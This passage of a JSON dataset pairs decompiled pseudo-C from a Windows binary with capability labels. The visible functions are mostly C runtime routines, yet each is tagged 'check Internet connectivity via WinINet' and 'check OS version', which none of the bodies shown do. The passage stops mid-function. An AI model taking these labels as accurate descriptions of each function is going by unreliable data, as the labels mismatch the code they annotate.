        "decompiled_code": "\nuint __fastcall fcn.0040d0f4(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_10h;\n    char *pcVar4;\n    int32_t iVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar5 = param_1[9];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x2d) == 'a') || (*(param_1 + 0x2d) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[9] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x2d) == 'g' || (iVar5 = 0,  *(param_1 + 0x2d) == 'G')))) {\n        param_1[9] = 1;\n        iVar5 = 1;\n    }\n    cVar2 = fcn.0040bbcb(iVar5 + 0x15d, param_1[2]);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.0040bbb3();\n        iVar5 = iVar5 + -0x15d;\n        param_1[9] = iVar5;\n    }\n    else {\n        iVar5 = param_1[9];\n    }\n    puVar3 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar3 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar3;\n    param_1[4] = param_1[4] + 8;\n    var_14h = *(param_1[4] + -8);\n    var_10h = *(param_1[4] + -4);\n    var_4h = *(param_1 + 0x2d);\n    var_8h = fcn.0040bbb3();\n    var_ch = fcn.0040bebd();\n    arg_10h = fcn.0040bbb3();\n    puVar3 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar3 = param_1[0x110];\n    }\n    fcn.00415029(&var_14h, puVar3, arg_10h, var_ch, var_8h, var_4h, iVar5, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.0040d4a0();\n        }\n        fcn.0040c7a6(param_1[0xc], iVar5 + 0xc);\n    }\n    if (((*(param_1 + 0x2d) == 'g') || (*(param_1 + 0x2d) == 'G')) && ((param_1[7] >> 5 & 1) == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.0040d4a0();\n        }\n        fcn.0040c709(param_1[0xc], iVar5 + 0xc);\n    }\n    pcVar4 = param_1[0xc];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xc] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        *(param_1 + 0x2d) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xd] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1092
    },
    "0040db95": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n\nvoid __cdecl fcn.0040db95(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    ushort *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    ushort *var_48h;\n    uint *var_44h;\n    int32_t var_40h;\n    ushort *var_3ch;\n    uint32_t var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uchar *var_2ch;\n    uint *var_28h;\n    int32_t var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint32_t var_18h;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    var_34h = arg_8h;\n    puVar8 = NULL;\n    var_1ch = NULL;\n    var_20h = NULL;\n    var_24h = 0;\n    var_58h = arg_8h;\n    var_54h = 0;\n    if (arg_8h[0x2a] == 0) {\n        piVar2 = arg_8h[0x23];\n        if (piVar2 != NULL) {\n            LOCK();\n            *piVar2 = *piVar2 + -1;\n        }\n        arg_8h[0x23] = 0;\n        arg_8h[0x24] = 0;\n        *arg_8h = 0x426088;\n        arg_8h[0x25] = 0x426308;\n        arg_8h[0x26] = 0x426488;\n        arg_8h[1] = 1;\n        goto code_r0x0040dfe3;\n    }\n    var_30h = NULL;\n    if ((arg_8h[2] == 0) && (iVar4 = fcn.00416781(&var_58h, 0, arg_8h[0x2a], 0x1004, arg_8h + 2),  iVar4 != 0)) {\ncode_r0x0040df76:\n        fcn.0041451c(var_30h);\n        fcn.0041451c(var_1ch);\n        fcn.0041451c(var_20h);\n        fcn.0041451c(puVar8);\n    }\n    else {\n        var_30h = fcn.004144bf(1, 4);\n        fcn.0041451c(0);\n        var_1ch = fcn.004144bf(0x180, 2);\n        fcn.0041451c(0);\n        var_20h = fcn.004144bf(0x180, 1);\n        fcn.0041451c(0);\n        puVar8 = fcn.004144bf(0x180, 1);\n        var_28h = puVar8;\n        fcn.0041451c(0);\n        var_24h = fcn.004144bf(0x101, 1);\n        fcn.0041451c(0);\n        if ((var_30h == NULL) || ((((var_1ch == NULL || (var_24h == 0)) || (var_20h == NULL)) || (puVar8 == NULL))))\n        goto code_r0x0040df76;\n        iVar4 = 0;\n        do {\n            *(iVar4 + var_24h) = iVar4;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x100);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h[2], &var_18h);\n        if ((iVar4 == 0) || (5 < var_18h)) goto code_r0x0040df76;\n        var_38h = var_18h & 0xffff;\n        if (1 < var_38h) {\n            if (arg_8h[2] == 0xfde9) {\n                fcn.004085e0(var_24h + 0x80, 0x20, 0x80);\n            }\n            else {\n                puVar6 = &var_12h;\n                uVar1 = var_12h;\n                while ((uVar1 != 0 && (arg_8h = var_34h,  *(puVar6 + 1) != 0))) {\n                    uVar5 = *puVar6;\n                    if (uVar5 <= *(puVar6 + 1)) {\n                        do {\n                            *(uVar5 + var_24h) = 0x20;\n                            uVar5 = uVar5 + 1;\n                        } while (uVar5 <= *(puVar6 + 1));\n                    }\n                    puVar6 = puVar6 + 2;\n                    uVar1 = *puVar6;\n                }\n            }\n        }\n        var_2ch = var_24h + 1;\n        iVar4 = fcn.00416c28(0, arg_8h[0x2a], 0x100, var_2ch, 0xff, var_20h + 0x81, 0xff, arg_8h[2], 0);\n        if ((iVar4 == 0) ||\n           (iVar4 = fcn.00416c28(0, arg_8h[0x2a], 0x200, var_2ch, 0xff, puVar8 + 0x81, 0xff, arg_8h[2], 0),  iVar4 == 0)\n           ) goto code_r0x0040df76;\n        var_44h = var_1ch + 0x40;\n        iVar4 = fcn.00416931(0, 1, var_24h, 0x100, var_44h, arg_8h[2], 0);\n        puVar12 = var_28h;\n        puVar6 = var_34h;\n        if (iVar4 == 0) goto code_r0x0040df76;\n        var_48h = var_1ch + 0xfe;\n        *var_48h = 0;\n        var_4ch = var_20h + 0x20;\n        *(var_20h + 0x7f) = 0;\n        *(var_28h + 0x7f) = 0;\n        *var_4ch = 0;\n        var_50h = var_28h + 0x20;\n        *var_50h = 0;\n        if (1 < var_38h) {\n            if (arg_8h[2] == 0xfde9) {\n                puVar8 = var_28h + 0x40;\n                iVar9 = var_20h - var_28h;\n                iVar4 = -0x142 - var_28h;\n                var_2ch = -0x80 - var_28h;\n                var_28h = var_1ch + 0x80;\n                do {\n                    puVar11 = var_28h + 2;\n                    *var_28h = (-(0x32 < iVar4 + puVar8) & 0x8000) + 0x8000;\n                    cVar3 = puVar8 + var_2ch;\n                    *(iVar9 + puVar8) = cVar3;\n                    *puVar8 = cVar3;\n                    puVar8 = puVar8 + 1;\n                    var_28h = puVar11;\n                } while (var_2ch + puVar8 < 0x100);\n            }\n            else {\n                puVar8 = &var_12h;\n                while ((var_12h != 0 && (*(puVar8 + 1) != 0))) {\n                    uVar5 = *puVar8;\n                    if (uVar5 <= *(puVar8 + 1)) {\n                        var_2ch = var_28h + uVar5 + 0x80;\n                        var_40h = var_20h - var_28h;\n                        var_3ch = var_1ch + uVar5 * 2 + 0x100;\n                        puVar7 = var_2ch;\n                        puVar10 = var_3ch;\n                        do {\n                            *puVar10 = 0x8000;\n                            puVar10 = puVar10 + 1;\n                            puVar7[var_40h] = uVar5;\n                            *puVar7 = uVar5;\n                            uVar5 = uVar5 + 1;\n                            puVar7 = puVar7 + 1;\n                        } while (uVar5 <= *(puVar8 + 1));\n                    }\n                    puVar8 = puVar8 + 2;\n                    var_12h._0_1_ = *puVar8;\n                }\n            }\n        }\n        puVar8 = var_1ch + 0x80;\n        puVar11 = var_1ch;\n        for (iVar4 = 0x3f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar11 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        *puVar11 = *puVar8;\n        puVar8 = var_20h + 0x40;\n        puVar11 = var_20h;\n        for (iVar4 = 0x1f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar11 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        *puVar11 = *puVar8;\n        *(puVar11 + 2) = *(puVar8 + 2);\n        puVar8 = puVar12 + 0x40;\n        for (iVar4 = 0x1f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar12 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar12 = puVar12 + 1;\n        }\n        *puVar12 = *puVar8;\n        *(puVar12 + 2) = *(puVar8 + 2);\n        piVar2 = var_34h[0x23];\n        if (piVar2 != NULL) {\n            LOCK();\n            iVar4 = *piVar2;\n            *piVar2 = iVar4 + -1;\n            if (iVar4 + -1 == 0) {\n                fcn.0041451c(var_34h[0x24] + -0xfe);\n                fcn.0041451c(puVar6[0x25] + -0x80);\n                fcn.0041451c(puVar6[0x26] + -0x80);\n                fcn.0041451c(puVar6[0x23]);\n            }\n        }\n        *var_30h = 1;\n        puVar6[0x23] = var_30h;\n        *puVar6 = var_44h;\n        puVar6[0x24] = var_48h;\n        puVar6[0x25] = var_4ch;\n        puVar6[0x26] = var_50h;\n        puVar6[1] = var_38h;\n    }\n    fcn.0041451c(var_24h);\ncode_r0x0040dfe3:\n    fcn.00406dcc(var_58h);\n    return;\n}\n",
        "token_count": 2712
    },
    "0040e32a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e32a(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    \n    if (arg_8h == 0) {\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_ch);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = 0xffffffff;\n        if ((*(arg_8h + 0xc) >> 0xd & 1) != 0) {\n            uVar1 = fcn.0040e625(arg_8h, arg_ch);\n            fcn.00416d80(arg_8h);\n            arg_8h_00 = fcn.00415447(arg_8h);\n            iVar2 = fcn.00416e51(arg_8h_00, arg_ch);\n            if (iVar2 < 0) {\n                uVar1 = 0xffffffff;\n            }\n            else if (*(arg_8h + 0x1c) != 0) {\n                fcn.0041451c(*(arg_8h + 0x1c));\n                *(arg_8h + 0x1c) = 0;\n            }\n        }\n        fcn.00416f94(arg_8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 347
    },
    "0040ee58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.0040ee58(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00407b00(0x430ca0, 0xc);\n    if ((*(unaff_EBP + 8) == 0) || (((iVar1 = *(unaff_EBP + 0x14),  iVar1 != 0 && (iVar1 != 1)) && (iVar1 != 2)))) {\n        iVar1 = *(unaff_EBP + 0x18);\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, iVar1);\n        uVar2 = 0xffffffff;\n    }\n    else {\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n        fcn.0040e26b(*(unaff_EBP + 8));\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0040efcd(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), iVar1, *(unaff_EBP + 0x18));\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0040eeea(0x430ca0);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 482
    },
    "0040f19a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040f19a(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        if (arg_14h != 0) {\n            var_20h = &arg_14h;\n            var_8h = arg_14h;\n            var_1ch = arg_18h;\n            var_18h = &arg_8h;\n            var_14h = &arg_ch;\n            var_10h = &arg_10h;\n            var_ch = arg_14h;\n            uVar1 = fcn.0040f0f3(&var_ch, &var_20h);\n            return uVar1;\n        }\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_18h);\n    }\n    return 0;\n}\n",
        "token_count": 350
    },
    "0040f75f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f75f(int32_t *arg_8h)\n\n{\n    int32_t *arg_ch;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    \n    *(in_ECX + 3) = 0;\n    arg_ch = in_ECX + 1;\n    if (arg_8h == NULL) {\n        iVar2 = *0x48e470;\n        iVar3 = *0x48e474;\n        if (*0x48fac4 != 0) {\n            iVar2 = fcn.004137e0();\n            *in_ECX = iVar2;\n            *arg_ch = *(iVar2 + 0x4c);\n            in_ECX[2] = *(iVar2 + 0x48);\n            fcn.004145a4(iVar2, arg_ch);\n            fcn.00414602(*in_ECX, in_ECX + 2);\n            uVar1 = *(*in_ECX + 0x350);\n            if ((uVar1 & 2) != 0) {\n                return;\n            }\n            *(*in_ECX + 0x350) = uVar1 | 2;\n            *(in_ECX + 3) = 1;\n            return;\n        }\n    }\n    else {\n        iVar2 = *arg_8h;\n        iVar3 = arg_8h[1];\n    }\n    *arg_ch = iVar2;\n    in_ECX[2] = iVar3;\n    return;\n}\n",
        "token_count": 342
    },
    "004104fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004104fb(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t *puVar3;\n    uint32_t **ppuVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    uint var_4h;\n    \n    ppuVar4 = fcn.00413931();\n    if (ppuVar4 != NULL) {\n        puVar1 = *ppuVar4;\n        for (puVar6 = puVar1; puVar6 != puVar1 + 0x24; puVar6 = puVar6 + 3) {\n            if (*puVar6 == arg_8h) {\n                if (puVar6 == NULL) {\n                    return 0;\n                }\n                pcVar2 = puVar6[2];\n                if (pcVar2 == NULL) {\n                    return 0;\n                }\n                if (pcVar2 == 0x5) {\n                    puVar6[2] = 0;\n                    return 1;\n                }\n                if (pcVar2 != 0x1) {\n                    puVar3 = ppuVar4[1];\n                    ppuVar4[1] = arg_ch;\n                    if (puVar6[1] == 8) {\n                        for (puVar5 = puVar1 + 9; puVar5 != puVar1 + 0x24; puVar5 = puVar5 + 3) {\n                            puVar5[2] = 0;\n                        }\n                        puVar1 = ppuVar4[2];\n                        puVar5 = puVar1;\n                        if (*puVar6 < 0xc0000092) {\n                            if (*puVar6 == 0xc0000091) {\n                                puVar5 = 0x84;\n                            }\n                            else if (*puVar6 == 0xc000008d) {\n                                puVar5 = 0x82;\n                            }\n                            else if (*puVar6 == 0xc000008e) {\n                                puVar5 = 0x83;\n                            }\n                            else if (*puVar6 == 0xc000008f) {\n                                puVar5 = 0x86;\n                            }\n                            else {\n                                if (*puVar6 != 0xc0000090) goto code_r0x0041060f;\n                                puVar5 = 0x81;\n                            }\ncode_r0x0041060c:\n                            ppuVar4[2] = puVar5;\n                        }\n                        else {\n                            if (*puVar6 == 0xc0000092) {\n                                puVar5 = 0x8a;\n                                goto code_r0x0041060c;\n                            }\n                            if (*puVar6 == 0xc0000093) {\n                                puVar5 = 0x85;\n                                goto code_r0x0041060c;\n                            }\n                            if (*puVar6 == 0xc00002b4) {\n                                puVar5 = 0x8e;\n                                goto code_r0x0041060c;\n                            }\n                            if (*puVar6 == 0xc00002b5) {\n                                puVar5 = 0x8d;\n                                goto code_r0x0041060c;\n                            }\n                        }\ncode_r0x0041060f:\n                        (**0x424130)(8, puVar5);\n                        (*pcVar2)();\n                        ppuVar4[2] = puVar1;\n                    }\n                    else {\n                        puVar6[2] = 0;\n                        (**0x424130)(puVar6[1]);\n                        (*pcVar2)();\n                    }\n                    ppuVar4[1] = puVar3;\n                }\n                return 0xffffffff;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 833
    },
    "004109e3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004109e3(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *arg_ch;\n    char *arg_8h_00;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar2 = 0;\n    }\n    else if ((arg_8h == 2) || (arg_8h == 1)) {\n        fcn.0041bad1();\n        fcn.0041b4ad(0, 0x48f988, 0x104);\n        *0x48faac = 0x48f988;\n        if ((*0x48fabc == NULL) || (arg_8h_00 = *0x48fabc,  **0x48fabc == '\\0')) {\n            arg_8h_00 = 0x48f988;\n        }\n        var_4h = 0;\n        var_ch = 0;\n        fcn.00410820(arg_8h_00, 0, 0, &var_4h, &var_ch);\n        arg_ch = fcn.00410994(var_4h, var_ch, 1);\n        if (arg_ch == NULL) {\n            puVar3 = fcn.0040e0ee();\n            iVar2 = 0xc;\n            *puVar3 = 0xc;\n        }\n        else {\n            fcn.00410820(arg_8h_00, arg_ch, arg_ch + var_4h, &var_4h, &var_ch);\n            if (arg_8h != 1) {\n                var_8h = NULL;\n                iVar2 = fcn.0041b4a2(arg_ch, &var_8h);\n                piVar1 = var_8h;\n                if (iVar2 == 0) {\n                    *0x48fab0 = 0;\n                    iVar2 = *var_8h;\n                    while (iVar2 != 0) {\n                        var_8h = var_8h + 1;\n                        *0x48fab0 = *0x48fab0 + 1;\n                        iVar2 = *var_8h;\n                    }\n                    var_8h = NULL;\n                    *0x48fab4 = piVar1;\n                    fcn.0041451c(0);\n                    iVar2 = 0;\n                }\n                else {\n                    fcn.0041451c(var_8h);\n                }\n                var_8h = NULL;\n                fcn.0041451c(arg_ch);\n                return iVar2;\n            }\n            *0x48fab0 = var_4h + -1;\n            iVar2 = 0;\n            *0x48fab4 = arg_ch;\n        }\n        fcn.0041451c(0);\n    }\n    else {\n        puVar3 = fcn.0040e0ee();\n        iVar2 = 0x16;\n        *puVar3 = 0x16;\n        fcn.0040b81f();\n    }\n    return iVar2;\n}\n",
        "token_count": 709
    },
    "00410a1a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00410a1a(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x48fa90 != 0) {\n        return 0;\n    }\n    fcn.0041bad1();\n    arg_8h = fcn.0041bdd3();\n    if (arg_8h == 0) {\n        fcn.0041451c(0);\n        return 0xffffffff;\n    }\n    iVar1 = fcn.00410a74(arg_8h);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = 0;\n        *0x48fa90 = iVar1;\n        *0x48fa9c = iVar1;\n    }\n    fcn.0041451c(0);\n    fcn.0041451c(arg_8h);\n    return uVar2;\n}\n",
        "token_count": 214
    },
    "00410d53": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00410d53(void)\n\n{\n    uint8_t uVar1;\n    int32_t **extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.00407b00(0x430d70, 0x18);\n    if (*0x48faa8 != '\\0') goto code_r0x00410e0a;\n    *0x48faa0 = 1;\n    *(unaff_EBP + -4) = 0;\n    uVar2 = *0x48e22c;\n    if (**extraout_ECX == 0) {\n        uVar1 = *0x48e22c & 0x1f;\n        *(unaff_EBP + -0x20) = *0x48e22c;\n        if (*0x48faa4 != uVar2) {\n            uVar2 = uVar2 ^ *0x48faa4;\n            pcVar3 = uVar2 >> uVar1 | uVar2 << 0x20 - uVar1;\n            *(unaff_EBP + -0x24) = pcVar3;\n            (**0x424130)(0, 0, 0);\n            (*pcVar3)();\n        }\n        arg_8h = 0x48fad0;\ncode_r0x00410dc1:\n        fcn.00412ad8(arg_8h);\n    }\n    else if (**extraout_ECX == 1) {\n        arg_8h = 0x48fadc;\n        goto code_r0x00410dc1;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (**extraout_ECX == 0) {\n        fcn.00410cad(0x42418c, 0x42419c);\n    }\n    fcn.00410cad(0x4241a0, 0x4241a4);\n    if (*extraout_ECX[1] == 0) {\n        *0x48faa8 = '\\x01';\n        *extraout_ECX[2] = 1;\n    }\ncode_r0x00410e0a:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return;\n}\n",
        "token_count": 586
    },
    "00410e3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410e3e(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *puVar4;\n    uint *var_24h;\n    uint *var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x42372f;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x48e22c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_10h == 0) {\n        cVar2 = fcn.00410f06(uVar3);\n        if (cVar2 != '\\0') {\n            fcn.00410f6b(arg_8h);\n        }\n    }\n    var_24h = &arg_ch;\n    var_dh = 0;\n    var_20h = &arg_10h;\n    var_1ch = &var_dh;\n    var_4h = 0;\n    var_14h = 2;\n    var_18h = 2;\n    puVar4 = &var_14h;\n    arg_ch_00 = &var_24h;\n    arg_8h_00 = &var_18h;\n    fcn.00410d06(arg_8h_00, arg_ch_00);\n    if (arg_10h != 0) {\n        *in_FS_OFFSET = var_ch;\n        return;\n    }\n    fcn.00410ed5(arg_8h);\n    pcVar1 = swi(3);\n    (*pcVar1)(arg_8h_00, arg_ch_00, puVar4);\n    return;\n}\n",
        "token_count": 468
    },
    "00410f6b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410f6b(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t hLibModule;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4236d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x48e22c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    hLibModule = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(0, 0x42736c, &hLibModule, uVar1);\n    if (iVar2 != 0) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, \"CorExitProcess\");\n        if (pcVar3 != NULL) {\n            (**0x424130)(arg_8h);\n            (*pcVar3)();\n        }\n    }\n    if (hLibModule != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 291
    },
    "00412021": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2e4h\n\nvoid __cdecl fcn.00412021(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint16_t *puVar13;\n    uint *puVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint32_t var_2c0h;\n    uint32_t var_2bch;\n    uint var_2b8h;\n    uint var_20ch;\n    uint var_10ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    iVar9 = fcn.004137e0();\n    puVar10 = iVar9 + 0x278;\n    iVar11 = fcn.0041170c(arg_10h, &var_10ch, 0x83, &var_2b8h, 0x55, &var_2c4h);\n    if (iVar11 != 0) {\n        iVar11 = (arg_ch + 2) * 